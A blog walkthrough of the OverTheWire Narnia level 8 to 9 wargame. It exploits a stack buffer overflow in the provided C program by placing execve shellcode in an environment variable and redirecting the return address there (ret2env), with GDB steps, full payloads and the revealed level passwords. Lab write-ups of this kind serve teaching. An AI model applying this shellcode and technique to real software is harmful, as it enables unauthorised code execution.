---
date: 2023-08-26 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 8 → 9 Walkthrough"
permalink: /posts/overTheWire-Narnia-Level-8-to-9/
tags: [overthewire, narnia, pwn, overflow, ret2env, binary-exploitation, linux, beginner]
description: "Step-by-step solution for OverTheWire Narnia Level 8 → 9."
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-7-to-8/' | relative_url }}">← Previous: Level 7 → 8</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia9.html" target="_blank" rel="noopener">Official (Level 9) ↗</a>
  </div>

  <div class="nav-right">
    <a class="disabled" aria-disabled="true">Next: End of Narnia series 🎉</a>
  </div>
</nav>

## Login

```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
# password: mohthuphog
````

---

## Task

Binary: **`/narnia/narnia8`**

```bash
cd /narnia
./narnia8
# ./narnia8 argument
./narnia8 test
# prints: test
```

The binary just prints back whatever we pass in.

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int i;

void func(char *b){
    char *blah = b;
    char bok[20];

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i]=blah[i];

    printf("%s\n", bok);
}

int main(int argc, char **argv){
    if(argc > 1) func(argv[1]);
    else printf("%s argument\n", argv[0]);
    return 0;
}
```

### Analysis

* `bok` is only 20 bytes, but the loop **doesn’t check bounds** → buffer overflow.
* By overflowing, we can overwrite stack values after `bok`, eventually reaching the **return address**.
* The buffer is too small for inline shellcode → the intended approach is **ret2env** (jump into shellcode placed in an environment variable).

---

## Exploitation Walkthrough

### Step 1: Inspect the stack in GDB

Set a breakpoint at the `printf` call inside `func`:

```gdb
gdb /narnia/narnia8
(gdb) disas func
(gdb) break *func+106
```

Run with 20 `A`s:

```gdb
(gdb) run $(python -c 'print 20*"A"')
(gdb) x/16wx $esp
```

We observe:

* Addresses of our input appear (e.g. `0xffffd871`)
* Return address of `main` (e.g. `0x080484a7`).

As we increase input length to 21, 22, … one byte of the saved address is corrupted. Each added byte requires us to **decrement the pointer address by 1** to stay aligned.

---

### Step 2: Control EIP

Payload pattern:

```
"A"*20 + <adjusted pointer> + "AAAA" + "CCCC"
```

Once tuned, EIP becomes `0x43434343` (CCCC), proving control.

---

### Step 3: Place shellcode in environment

```bash
export SHELLCODE=$(printf \
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"\
"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"\
"\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80")
```

In GDB, locate it:

```gdb
(gdb) x/s *((char **)environ)
# ... eventually shows "SHELLCODE=..."
# example at 0xffffde92
```

Replace “CCCC” in payload with this address (little-endian):

```gdb
(gdb) run $(python -c 'print 20*"A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')
# → /bin/dash
```

---

### Step 4: Outside GDB

Since GDB changes memory layout, compile a helper:

```c
// /tmp/find_addr.c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char* argv[]){
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

```bash
cd /tmp
gcc -m32 find_addr.c -o find_addr
./find_addr SHELLCODE
# e.g. SHELLCODE is at 0xffffdea1
```

Find adjusted input pointer from program output (subtract \~12), then build payload:

```bash
/narnia/narnia8 $(python -c 'print 20*"A" + "\x5e\xd8\xff\xff" + "AAAA" + "\xa1\xde\xff\xff"')
```

And boom:

```bash
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

---

## Password

```
eiL5fealae
```

---

## Key Takeaways

* Small buffer = overflow.
* Each extra byte shifts stack → adjust pointer accordingly.
* Environment variables are a reliable place for shellcode when the local buffer is too small.
* Always test addresses **outside gdb**.

---

## Thanks for reading!

You’ve now cleared **all Narnia levels (0 → 9)** 🎉. Time to celebrate and move on to the next wargame!

![Congrats]({{ '/assets/images/advice/cinema.gif' | relative_url }})

